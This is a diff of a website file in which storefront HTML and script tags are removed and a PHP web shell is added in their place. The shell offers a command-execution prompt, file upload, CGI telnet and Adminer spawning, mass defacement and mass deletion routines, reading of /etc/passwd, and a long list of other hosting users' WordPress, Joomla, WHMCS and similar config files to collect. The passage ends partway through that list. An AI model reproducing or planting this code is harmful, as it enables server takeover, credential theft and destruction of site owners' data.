+	 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+	 	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+	   	  curl_setopt($ch, CURLOPT_FILE, $fp);
+	return curl_exec($ch);
+	   	  curl_close($ch);
+	fclose($fp);
+	ob_flush();
+	flush();
+}
 
-      window.variantStrings = {
-        addToCart: `Add to cart`,
-        soldOut: `Sold out`,
-        unavailable: `Unavailable`,
-        unavailable_with_option: `[value] - Unavailable`,
-      };
+function usergroup() {
+	if(!function_exists('posix_getegid')) {
+		$user['name'] 	= @get_current_user();
+		$user['uid']  	= @getmyuid();
+		$user['gid']  	= @getmygid();
+		$user['group']	= "?";
+	} else {
+		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
+		$user['gid'] 	= @posix_getgrgid(posix_getegid());
+		$user['name'] 	= $user['uid']['name'];
+		$user['uid'] 	= $user['uid']['uid'];
+		$user['group'] 	= $user['gid']['name'];
+		$user['gid'] 	= $user['gid']['gid'];
+	}
+	return (object) $user;
+}
 
-      window.quickOrderListStrings = {
-        itemsAdded: `[quantity] items added`,
-        itemAdded: `[quantity] item added`,
-        itemsRemoved: `[quantity] items removed`,
-        itemRemoved: `[quantity] item removed`,
-        viewCart: `View cart`,
-        each: `[money]/ea`,
-      };
+function getuser() {
+	$fopen = fopen("/etc/passwd", "r") or die(color(1, 1, "Can't read /etc/passwd"));
+	while($read = fgets($fopen)) {
+		preg_match_all('/(.*?):x:/', $read, $getuser);
+		$user[] = $getuser[1][0];
+	}
+	return $user;
+}
 
-      window.accessibilityStrings = {
-        imageAvailable: `Image [index] is now available in gallery view`,
-        shareSuccess: `Link copied to clipboard`,
-        pauseSlideshow: `Pause slideshow`,
-        playSlideshow: `Play slideshow`,
-        recipientFormExpanded: `Gift card recipient form expanded`,
-        recipientFormCollapsed: `Gift card recipient form collapsed`,
-      };
-    </script>
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/product-modal63b8.js?v=116616134454508949461702987225" defer="defer"></script>
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/media-gallery1d8f.js?v=96661908581229995091702987225" defer="defer"></script>
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/share9ff9.js?v=13024540447964430191702987226" defer="defer"></script>
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/pickup-availabilityecd7.html?v=66138958121968076331702987225" defer="defer"></script>
-    <script src="https://seafoodsallys.com/cdn/shop/t/1/assets/predictive-search29eb.js?v=162273246065392412141702987225" defer="defer"></script>
-  </body>
+function getdomainname() {
+	$fopen = fopen("/etc/named.conf", "r");
+	while($read = fgets($fopen)) {
+		preg_match_all("#/var/named/(.*?).db#", $read, $getdomain);
+		$domain[] = $getdomain[1][0];
+	}
+	return $domain;
+}
+
+function hddsize($size) {
+	if($size >= 1073741824)
+		return sprintf('%1.2f',$size / 1073741824 ).' GB';
+	elseif($size >= 1048576)
+		return sprintf('%1.2f',$size / 1048576 ) .' MB';
+	elseif($size >= 1024)
+		return sprintf('%1.2f',$size / 1024 ) .' KB';
+	else
+		return $size .' B';
+}
+
+function hdd() {
+	$hdd['size'] = hddsize(disk_total_space("/"));
+	$hdd['free'] = hddsize(disk_free_space("/"));
+	$hdd['used'] = hddsize(disk_total_space("/") - disk_free_space("/"));
+	return (object) $hdd;
+}
+
+function writeable($path, $perms) {
+	return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 2, $perms);
+}
+
+function perms($path) {
+	$perms = fileperms($path);
+	if (($perms & 0xC000) == 0xC000) {
+		// Socket
+		$info = 's';
+	} 
+	elseif (($perms & 0xA000) == 0xA000) {
+		// Symbolic Link
+		$info = 'l';
+	} 
+	elseif (($perms & 0x8000) == 0x8000) {
+		// Regular
+		$info = '-';
+	} 
+	elseif (($perms & 0x6000) == 0x6000) {
+		// Block special
+		$info = 'b';
+	} 
+	elseif (($perms & 0x4000) == 0x4000) {
+		// Directory
+		$info = 'd';
+	} 
+	elseif (($perms & 0x2000) == 0x2000) {
+		// Character special
+		$info = 'c';
+	} 
+	elseif (($perms & 0x1000) == 0x1000) {
+		// FIFO pipe
+		$info = 'p';
+	} 
+	else {
+		// Unknown
+		$info = 'u';
+	}
+		// Owner
+	$info .= (($perms & 0x0100) ? 'r' : '-');
+	$info .= (($perms & 0x0080) ? 'w' : '-');
+	$info .= (($perms & 0x0040) ?
+	(($perms & 0x0800) ? 's' : 'x' ) :
+	(($perms & 0x0800) ? 'S' : '-'));
+	// Group
+	$info .= (($perms & 0x0020) ? 'r' : '-');
+	$info .= (($perms & 0x0010) ? 'w' : '-');
+	$info .= (($perms & 0x0008) ?
+	(($perms & 0x0400) ? 's' : 'x' ) :
+	(($perms & 0x0400) ? 'S' : '-'));
+	// World
+	$info .= (($perms & 0x0004) ? 'r' : '-');
+	$info .= (($perms & 0x0002) ? 'w' : '-');
+	$info .= (($perms & 0x0001) ?
+	(($perms & 0x0200) ? 't' : 'x' ) :
+	(($perms & 0x0200) ? 'T' : '-'));
+
+	return $info;
+}
+
+function lib_installed() {
+	$lib[] = "MySQL: ".(function_exists('mysql_connect') ? color(1, 2, "ON") : color(1, 1, "OFF"));
+	$lib[] = "cURL: ".(function_exists('curl_version') ? color(1, 2, "ON") : color(1, 1, "OFF"));
+	$lib[] = "WGET: ".(exe('wget --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
+	$lib[] = "Perl: ".(exe('perl --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
+	$lib[] = "Python: ".(exe('python --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
+	return implode(" | ", $lib);
+}
+
+function pwd() {
+	$dir = explode("/", path());
+	foreach($dir as $key => $index) {
+		print "<a href='?dir=";
+		for($i = 0; $i <= $key; $i++) {
+			print $dir[$i];
+			if($i != $key) {
+			print "/";
+			}
+		}
+		print "'>$index</a>/";
+	}
+	print "<br>";
+	print (OS() === "Windows") ? windisk() : "";
+}
+
+function windisk() {
+	$letters = "";
+	$v = explode("\\", path());
+	$v = $v[0];
+	 foreach(range("A", "Z") as $letter) {
+	  	$bool = $isdiskette = in_array($letter, array("A"));
+	  	if(!$bool) $bool = is_dir("$letter:\\");
+	  	if($bool) {
+	   		$letters .= "[ <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
+	   		if($letter.":" != $v) {
+	   			$letters .= $letter;
+	   		}
+	   		else {
+	   			$letters .= color(1, 2, $letter);
+	   		}
+	   		$letters .= "</a> ]";
+	  	}
+	}
+	if(!empty($letters)) {
+		print "Detected Drives $letters<br>";
+	}
+	if(count($quicklaunch) > 0) {
+		foreach($quicklaunch as $item) {
+	  		$v = realpath(path(). "..");
+	  		if(empty($v)) {
+	  			$a = explode(DIRECTORY_SEPARATOR,path());
+	  			unset($a[count($a)-2]);
+	  			$v = join(DIRECTORY_SEPARATOR, $a);
+	  		}
+	  		print "<a href='".$item[1]."'>".$item[0]."</a>";
+		}
+	}
+}
+
+function serverinfo() {
+	$disable_functions = @ini_get('disable_functions');
+	$disable_functions = (!empty($disable_functions)) ? color(1, 1, $disable_functions) : color(1, 2, "NONE");
+
+	$output[] = "<font face=courier><i>SERVER IP ".color(1, 2, $GLOBALS['SERVERIP'])." / YOUR IP ".color(1, 2, $_SERVER['REMOTE_ADDR']);
+	$output[] = "WEB SERVER  : ".color(1, 2, $_SERVER['SERVER_SOFTWARE']);
+	$output[] = "SYSTEM      : ".color(1, 2, php_uname());
+	$output[] = "USER / GROUP: ".color(1, 2, usergroup()->name)."(".color(1, 2 , usergroup()->uid).") / ".color(1, 2 , usergroup()->group)."(".color(1, 2 , usergroup()->gid).")";
+	$output[] = "HDD         : ".color(1, 2, hdd()->used)." / ".color(1, 2 , hdd()->size)." (Free: ".color(1, 2 , hdd()->free).")";
+	$output[] = "PHP VERSION : ".color(1, 2, @phpversion());
+	$output[] = "SAFE MODE   : ".(@ini_get(strtoupper("safe_mode")) === "ON" ? color(1, 2, "ON") : color(1, 2, "OFF"));
+	$output[] = "DISABLE FUNC: $disable_functions";
+	$output[] = lib_installed();
+	$output[] = "Current Dir (".writeable(path(), perms(path())).")</font> ";
+
+	print "<pre>";
+	print implode("<br>", $output);
+	pwd();
+	print "</pre>";
+
+}
+
+function curl($url, $post = false, $data = null) {
+    $ch = curl_init($url);
+    	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    	  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    	  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    	  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
+    if($post) {
+    	  curl_setopt($ch, CURLOPT_POST, true);
+    	  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    }
+    return curl_exec($ch);
+		  curl_close($ch);
+}
+
+function reverse() {
+	$response = curl("http://domains.yougetsignal.com/domains.php", TRUE, "remoteAddress=".$GLOBALS['SERVERIP']."&ket=");
+	$response = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $response)))))))))))));
+	$explode  = explode(",,", $response);
+	unset($explode[0]);
+
+	foreach($explode as $domain) {
+		$domain = "http://$domain";
+		$domain = str_replace(",", "", $domain);
+		$url[] 	= $domain;
+		ob_flush();
+		flush();
+	}
+
+	return $url;
+}
+
+function getValue($param, $kata1, $kata2){
+    if(strpos($param, $kata1) === FALSE) return FALSE;
+    if(strpos($param, $kata2) === FALSE) return FALSE;
+    $start 	= strpos($param, $kata1) + strlen($kata1);
+    $end 	= strpos($param, $kata2, $start);
+    $return = substr($param, $start, $end - $start);
+    return $return;
+}
+
+function massdeface($dir, $file, $filename, $type = null) {
+	$scandir = scandir($dir);
+	foreach($scandir as $dir_) {
+		$path     = "$dir/$dir_";
+		$location = "$path/$filename";
+		if($dir_ === "." || $dir_ === "..") {
+			file_put_contents($location, $file);
+		}
+		else {
+			if(is_dir($path) AND is_writable($path)) {
+				print "[".color(1, 2, "DONE")."] ".color(1, 4, $location)."<br>";
+				file_put_contents($location, $file);
+				if($type === "-alldir") {
+					massdeface($path, $file, $filename, "-alldir");
+				}
+			}
+		}
+	}
+}
+
+function massdelete($dir, $filename) {
+	$scandir = scandir($dir);
+	foreach($scandir as $dir_) {
+		$path     = "$dir/$dir_";
+		$location = "$path/$filename";
+		if($dir_ === '.') {
+			if(file_exists("$dir/$filename")) {
+				unlink("$dir/$filename");
+			}
+		} 
+		elseif($dir_ === '..') {
+			if(file_exists(dirname($dir)."/$filename")) {
+				unlink(dirname($dir)."/$filename");
+			}
+		} 
+		else {
+			if(is_dir($path) AND is_writable($path)) {
+				if(file_exists($location)) {
+					print "[".color(1, 2, "DELETED")."] ".color(1, 4, $location)."<br>";
+					unlink($location);
+					massdelete($path, $filename);
+				}
+			}
+		}
+	}
+}
+
+function tools($toolsname, $args = null) {
+	if($toolsname === "cmd") {
+		print "<form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 15px;'>
+			  ".usergroup()->name."@".$GLOBALS['SERVERIP'].": ~ $
+			  <input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='cmd' required>
+			  <input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='>>'>
+			  </form>";
+	}
+	elseif($toolsname === "readfile") {
+		if(empty($args)) die(color(1, 1, $msg));
+		if(!is_file($args)) die(color(1, 1, "File '$args' is not exists."));
+
+		print "<pre>";
+		print htmlspecialchars(file_get_contents($args));
+		print "</pre>";
+	}
+	elseif($toolsname === "spawn") {
+		if($args === "adminer") {
+			if(file_exists("adminer.php")) {
+				print "Login Adminer: <a href='".$GLOBALS['FILEPATH']."/adminer.php' target='_blank'>http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/adminer.php</a>";
+			}
+			else {
+				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'Adminer'."));
+				if(getfile("adminer")) {
+					print "Login Adminer: <a href='".$GLOBALS['FILEPATH']."/adminer.php' target='_blank'>http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/adminer.php</a>";
+				}
+				else {
+					print color(1, 1, "Error while downloading file Adminer.");
+					@unlink("adminer.php");
+				}
+			}
+		}
+		elseif($args === "webconsole") {
+			if(file_exists("webconsole.php")) {
+				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/webconsole.php' frameborder='0' scrolling='yes'></iframe>";
+			}
+			else {
+				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'WebConsole'."));
+				if(getfile("webconsole")) {
+					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/webconsole.php' frameborder='0' scrolling='yes'></iframe>";
+				}
+				else {
+					print color(1, 1, "Error while downloading file WebConsole.");
+					@unlink("webconsole.php");
+				}
+			}
+		}
+		elseif($args === "cgitelnet1") {
+			if(file_exists("idx_cgi/cgitelnet1.idx")) {
+				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
+			}
+			elseif(file_exists('cgitelnet1.idx')) {
+				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
+			}
+			else {
+				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_cgi'."));
+				if(!is_dir(path()."/idx_cgi/")) {
+					@mkdir('idx_cgi', 0755);
+					save("idx_cgi/.htaccess", "w", "AddHandler cgi-script .idx");
+				}
+				if(getfile("cgitelnet1")) {
+					chmod('idx_cgi/cgitelnet1.idx', 0755);
+					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
+				}
+				else {
+					print color(1, 1, "Error while downloading file CGI Telnet.");
+					@rmdir(path()."/idx_cgi/");
+					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Linux") @exe("rm -rf ".path()."/idx_cgi/");
+					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Windows") @exe("rmdir /s /q ".path()."/idx_cgi/");
+				}
+			}
+	
+		}
+		elseif($args === "cgitelnet2") {
+			if(file_exists("idx_cgi/cgitelnet2.idx")) {
+				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet2.idx' frameborder='0' scrolling='yes'></iframe>";
+			}
+			elseif(file_exists('cgitelnet2.idx')) {
+				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/cgitelnet2.idx' frameborder='0' scrolling='no'></iframe>";
+			}
+			else {
+				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_cgi'."));
+				if(!is_dir(path()."/idx_cgi/")) {
+					@mkdir('idx_cgi', 0755);
+					save("idx_cgi/.htaccess", "w", "AddHandler cgi-script .idx");
+				}
+				if(getfile("cgitelnet2")) {
+					chmod('idx_cgi/cgitelnet2.idx', 0755);
+					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet2.idx' frameborder='0' scrolling='yes'></iframe>";
+				}
+				else {
+					print color(1, 1, "Error while downloading file CGI Telnet.");
+					@rmdir(path()."/idx_cgi/");
+					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Linux") @exe("rm -rf ".path()."/idx_cgi/");
+					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Windows") @exe("rmdir /s /q ".path()."/idx_cgi/");
+				}
+			}
+	
+		}
+		elseif($args === "phpinfo") {
+			if(file_exists('phpinfo.php') AND preg_match("/phpinfo()/", file_get_contents('phpinfo.php'))) {
+				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/phpinfo.php' frameborder='0' scrolling='yes'></iframe>";
+			}
+			else {
+				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'phpinfo'."));
+				save("phpinfo.php", "w", "<?php print '<html><style>html,body {background: #1e1e1e;}</style><div style=\'background: #1e1e1e; color: #cccccc;\'>'; phpinfo(); print '</div></html>'; ?>");
+				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/phpinfo.php' frameborder='0' scrolling='yes'></iframe>";
+			}
+		}
+	}
+	elseif($toolsname === "upload") {
+		if($_POST['upload']) {
+			if($_POST['uploadtype'] === '1') {
+				if(@copy($_FILES['file']['tmp_name'], path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."")) {
+					$act = color(1, 2, "Uploaded!")." at <i><b>".path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."</b></i>";
+				} 
+				else {
+					$act = color(1, 1, "Failed to upload file!");
+				}
+			} 
+			elseif($_POST['uploadtype'] === '2') {
+				$root = $_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
+				$web = $_SERVER['HTTP_HOST'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
+				if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
+					if(@copy($_FILES['file']['tmp_name'], $root)) {
+						$act = color(1, 2, "Uploaded!")." at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
+					} 
+					else {
+						$act = color(1, 1, "Failed to upload file!");
+					}
+				} 
+				else {
+					$act = color(1, 1, "Failed to upload file!");
+				}
+			}
+		}
+		print "Upload File: $act
+			  <form method='post' enctype='multipart/form-data'>
+			  <input type='radio' name='uploadtype' value='1' checked>current_dir [ ".writeable(path(), "Writeable")." ] 
+			  <input type='radio' name='uploadtype' value='2'>document_root [ ".writeable($_SERVER['DOCUMENT_ROOT'], "Writeable")." ]<br></i>
+			  <input type='file' name='file'>
+			  <input type='submit' value='upload' name='upload'>
+			  </form>";
+	}
+	elseif($toolsname === "jumping") {
+		$i = 0;
+		foreach(getuser() as $user) {
+			$path = "/home/$user/public_html";
+			if(is_readable($path)) {
+				$status = color(1, 2, "[R]");
+				if(is_writable($path)) {
+					$status = color(1, 2, "[RW]");
+				}
+				$i++;
+				print "$status <a href='?dir=$path'>".color(1, 4, $path)."</a>";
+				if(!function_exists('posix_getpwuid')) print "<br>";
+				if(!getdomainname()) print " => ".color(1, 1, "Can't get domain name")."<br>";
+				foreach(getdomainname() as $domain) {
+					$userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain"));
+					$userdomain = $userdomain->name;
+					if($userdomain === $user) {
+						print " => <a href='http://$domain/' target='_blank'>".color(1, 2, $domain)."</a><br>";
+						break;
+					}
+				}
+			}
+		}
+		print ($i === 0) ? "" : "<p>".color(1, 3, "Total ada $i kamar di ".$GLOBALS['SERVERIP'])."</p>";
+	}
+	elseif($toolsname === "idxconfig") {
+		if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_config'."));
+		if(!is_dir(path()."/idx_config/")) {
+			@mkdir('idx_config', 0755);
+			$htaccess = "Options all\nDirectoryIndex smc.htm\nSatisfy Any";
+			save("idx_config/.htaccess","w", $htaccess);
+
+			foreach(getuser() as $user) {
+				$user_docroot = "/home/$user/public_html/";
+				if(is_readable($user_docroot)) {
+					$getconfig = array(
+						"/home/$user/.accesshash" => "WHM-accesshash",
+						"$user_docroot/config/koneksi.php" => "Lokomedia",
+						"$user_docroot/forum/config.php" => "phpBB",
+						"$user_docroot/sites/default/settings.php" => "Drupal",
+						"$user_docroot/config/settings.inc.php" => "PrestaShop",
+						"$user_docroot/app/etc/local.xml" => "Magento",
+						"$user_docroot/admin/config.php" => "OpenCart",
+						"$user_docroot/application/config/database.php" => "Ellislab",
+						"$user_docroot/vb/includes/config.php" => "Vbulletin",
+						"$user_docroot/includes/config.php" => "Vbulletin",
+						"$user_docroot/forum/includes/config.php" => "Vbulletin",
+						"$user_docroot/forums/includes/config.php" => "Vbulletin",
+						"$user_docroot/cc/includes/config.php" => "Vbulletin",
+						"$user_docroot/inc/config.php" => "MyBB",
+						"$user_docroot/includes/configure.php" => "OsCommerce",
+						"$user_docroot/shop/includes/configure.php" => "OsCommerce",
+						"$user_docroot/os/includes/configure.php" => "OsCommerce",
+						"$user_docroot/oscom/includes/configure.php" => "OsCommerce",
+						"$user_docroot/products/includes/configure.php" => "OsCommerce",
+						"$user_docroot/cart/includes/configure.php" => "OsCommerce",
+						"$user_docroot/inc/conf_global.php" => "IPB",
+						"$user_docroot/wp-config.php" => "Wordpress",
+						"$user_docroot/wp/test/wp-config.php" => "Wordpress",
+						"$user_docroot/blog/wp-config.php" => "Wordpress",
+						"$user_docroot/beta/wp-config.php" => "Wordpress",
+						"$user_docroot/portal/wp-config.php" => "Wordpress",
+						"$user_docroot/site/wp-config.php" => "Wordpress",
+						"$user_docroot/wp/wp-config.php" => "Wordpress",
+						"$user_docroot/WP/wp-config.php" => "Wordpress",
+						"$user_docroot/news/wp-config.php" => "Wordpress",
+						"$user_docroot/wordpress/wp-config.php" => "Wordpress",
+						"$user_docroot/test/wp-config.php" => "Wordpress",
+						"$user_docroot/demo/wp-config.php" => "Wordpress",
+						"$user_docroot/home/wp-config.php" => "Wordpress",
+						"$user_docroot/v1/wp-config.php" => "Wordpress",
+						"$user_docroot/v2/wp-config.php" => "Wordpress",
+						"$user_docroot/press/wp-config.php" => "Wordpress",
+						"$user_docroot/new/wp-config.php" => "Wordpress",
+						"$user_docroot/blogs/wp-config.php" => "Wordpress",
+						"$user_docroot/configuration.php" => "Joomla",
+						"$user_docroot/blog/configuration.php" => "Joomla",
+						"$user_docroot/submitticket.php" => "^WHMCS",
+						"$user_docroot/cms/configuration.php" => "Joomla",
+						"$user_docroot/beta/configuration.php" => "Joomla",
+						"$user_docroot/portal/configuration.php" => "Joomla",
+						"$user_docroot/site/configuration.php" => "Joomla",
+						"$user_docroot/main/configuration.php" => "Joomla",
+						"$user_docroot/home/configuration.php" => "Joomla",
+						"$user_docroot/demo/configuration.php" => "Joomla",
+						"$user_docroot/test/configuration.php" => "Joomla",
+						"$user_docroot/v1/configuration.php" => "Joomla",
+						"$user_docroot/v2/configuration.php" => "Joomla",
+						"$user_docroot/joomla/configuration.php" => "Joomla",
+						"$user_docroot/new/configuration.php" => "Joomla",
+						"$user_docroot/WHMCS/submitticket.php" => "WHMCS",
+						"$user_docroot/whmcs1/submitticket.php" => "WHMCS",
+						"$user_docroot/Whmcs/submitticket.php" => "WHMCS",
+						"$user_docroot/whmcs/submitticket.php" => "WHMCS",
+						"$user_docroot/whmcs/submitticket.php" => "WHMCS",
+						"$user_docroot/WHMC/submitticket.php" => "WHMCS",
+						"$user_docroot/Whmc/submitticket.php" => "WHMCS",
+						"$user_docroot/whmc/submitticket.php" => "WHMCS",
+						"$user_docroot/WHM/submitticket.php" => "WHMCS",
+						"$user_docroot/Whm/submitticket.php" => "WHMCS",
+						"$user_docroot/whm/submitticket.php" => "WHMCS",
+						"$user_docroot/HOST/submitticket.php" => "WHMCS",
+						"$user_docroot/Host/submitticket.php" => "WHMCS",
+						"$user_docroot/host/submitticket.php" => "WHMCS",
+						"$user_docroot/SUPPORTES/submitticket.php" => "WHMCS",
+						"$user_docroot/Supportes/submitticket.php" => "WHMCS",
+						"$user_docroot/supportes/submitticket.php" => "WHMCS",
+						"$user_docroot/domains/submitticket.php" => "WHMCS",
+						"$user_docroot/domain/submitticket.php" => "WHMCS",
+						"$user_docroot/Hosting/submitticket.php" => "WHMCS",
+						"$user_docroot/HOSTING/submitticket.php" => "WHMCS",
+						"$user_docroot/hosting/submitticket.php" => "WHMCS",
+						"$user_docroot/CART/submitticket.php" => "WHMCS",
+						"$user_docroot/Cart/submitticket.php" => "WHMCS",
+						"$user_docroot/cart/submitticket.php" => "WHMCS",
+						"$user_docroot/ORDER/submitticket.php" => "WHMCS",
+						"$user_docroot/Order/submitticket.php" => "WHMCS",
+						"$user_docroot/order/submitticket.php" => "WHMCS",
+						"$user_docroot/CLIENT/submitticket.php" => "WHMCS",
+						"$user_docroot/Client/submitticket.php" => "WHMCS",
+						"$user_docroot/client/submitticket.php" => "WHMCS",
+						"$user_docroot/CLIENTAREA/submitticket.php" => "WHMCS",
+						"$user_docroot/Clientarea/submitticket.php" => "WHMCS",
+						"$user_docroot/clientarea/submitticket.php" => "WHMCS",
+						"$user_docroot/SUPPORT/submitticket.php" => "WHMCS",
+						"$user_docroot/Support/submitticket.php" => "WHMCS",
+						"$user_docroot/support/submitticket.php" => "WHMCS",
+						"$user_docroot/BILLING/submitticket.php" => "WHMCS",
+						"$user_docroot/Billing/submitticket.php" => "WHMCS",
+						"$user_docroot/billing/submitticket.php" => "WHMCS",
+						"$user_docroot/BUY/submitticket.php" => "WHMCS",
+						"$user_docroot/Buy/submitticket.php" => "WHMCS",
+						"$user_docroot/buy/submitticket.php" => "WHMCS",
+						"$user_docroot/MANAGE/submitticket.php" => "WHMCS",
+						"$user_docroot/Manage/submitticket.php" => "WHMCS",
+						"$user_docroot/manage/submitticket.php" => "WHMCS",
+						"$user_docroot/CLIENTSUPPORT/submitticket.php" => "WHMCS",
+						"$user_docroot/ClientSupport/submitticket.php" => "WHMCS",
+						"$user_docroot/Clientsupport/submitticket.php" => "WHMCS",
+						"$user_docroot/clientsupport/submitticket.php" => "WHMCS",
+						"$user_docroot/CHECKOUT/submitticket.php" => "WHMCS",
+						"$user_docroot/Checkout/submitticket.php" => "WHMCS",
+						"$user_docroot/checkout/submitticket.php" => "WHMCS",
+						"$user_docroot/BILLINGS/submitticket.php" => "WHMCS",
+						"$user_docroot/Billings/submitticket.php" => "WHMCS",
+						"$user_docroot/billings/submitticket.php" => "WHMCS",
+						"$user_docroot/BASKET/submitticket.php" => "WHMCS",
+						"$user_docroot/Basket/submitticket.php" => "WHMCS",
+						"$user_docroot/basket/submitticket.php" => "WHMCS",
+						"$user_docroot/SECURE/submitticket.php" => "WHMCS",
+						"$user_docroot/Secure/submitticket.php" => "WHMCS",
+						"$user_docroot/secure/submitticket.php" => "WHMCS",
+						"$user_docroot/SALES/submitticket.php" => "WHMCS",
+						"$user_docroot/Sales/submitticket.php" => "WHMCS",
+						"$user_docroot/sales/submitticket.php" => "WHMCS",
+						"$user_docroot/BILL/submitticket.php" => "WHMCS",
+						"$user_docroot/Bill/submitticket.php" => "WHMCS",
+						"$user_docroot/bill/submitticket.php" => "WHMCS",
+						"$user_docroot/PURCHASE/submitticket.php" => "WHMCS",
+						"$user_docroot/Purchase/submitticket.php" => "WHMCS",
+						"$user_docroot/purchase/submitticket.php" => "WHMCS",
+						"$user_docroot/ACCOUNT/submitticket.php" => "WHMCS",
+						"$user_docroot/Account/submitticket.php" => "WHMCS",
+						"$user_docroot/account/submitticket.php" => "WHMCS",
+						"$user_docroot/USER/submitticket.php" => "WHMCS",
+						"$user_docroot/User/submitticket.php" => "WHMCS",
+						"$user_docroot/user/submitticket.php" => "WHMCS",
+						"$user_docroot/CLIENTS/submitticket.php" => "WHMCS",
+						"$user_docroot/Clients/submitticket.php" => "WHMCS",
+						"$user_docroot/clients/submitticket.php" => "WHMCS",
+						"$user_docroot/BILLINGS/submitticket.php" => "WHMCS",
+						"$user_docroot/Billings/submitticket.php" => "WHMCS",
+						"$user_docroot/billings/submitticket.php" => "WHMCS",
+						"$user_docroot/MY/submitticket.php" => "WHMCS",
+						"$user_docroot/My/submitticket.php" => "WHMCS",
+						"$user_docroot/my/submitticket.php" => "WHMCS",
+						"$user_docroot/secure/whm/submitticket.php" => "WHMCS",
+						"$user_docroot/secure/whmcs/submitticket.php" => "WHMCS",
+						"$user_docroot/panel/submitticket.php" => "WHMCS",
+						"$user_docroot/clientes/submitticket.php" => "WHMCS",
+						"$user_docroot/cliente/submitticket.php" => "WHMCS",
+						"$user_docroot/support/order/submitticket.php" => "WHMCS",
+						"$user_docroot/bb-config.php" => "BoxBilling",
+						"$user_docroot/boxbilling/bb-config.php" => "BoxBilling",
+						"$user_docroot/box/bb-config.php" => "BoxBilling",
+						"$user_docroot/host/bb-config.php" => "BoxBilling",
+						"$user_docroot/Host/bb-config.php" => "BoxBilling",
+						"$user_docroot/supportes/bb-config.php" => "BoxBilling",
+						"$user_docroot/support/bb-config.php" => "BoxBilling",
+						"$user_docroot/hosting/bb-config.php" => "BoxBilling",
+						"$user_docroot/cart/bb-config.php" => "BoxBilling",
+						"$user_docroot/order/bb-config.php" => "BoxBilling",
+						"$user_docroot/client/bb-config.php" => "BoxBilling",
+						"$user_docroot/clients/bb-config.php" => "BoxBilling",
+						"$user_docroot/cliente/bb-config.php" => "BoxBilling",
+						"$user_docroot/clientes/bb-config.php" => "BoxBilling",
+						"$user_docroot/billing/bb-config.php" => "BoxBilling",
+						"$user_docroot/billings/bb-config.php" => "BoxBilling",
+						"$user_docroot/my/bb-config.php" => "BoxBilling",
+						"$user_docroot/secure/bb-config.php" => "BoxBilling",
+						"$user_docroot/support/order/bb-config.php" => "BoxBilling",
+						"$user_docroot/includes/dist-configure.php" => "Zencart",
+						"$user_docroot/zencart/includes/dist-configure.php" => "Zencart",
+						"$user_docroot/products/includes/dist-configure.php" => "Zencart",
+						"$user_docroot/cart/includes/dist-configure.php" => "Zencart",
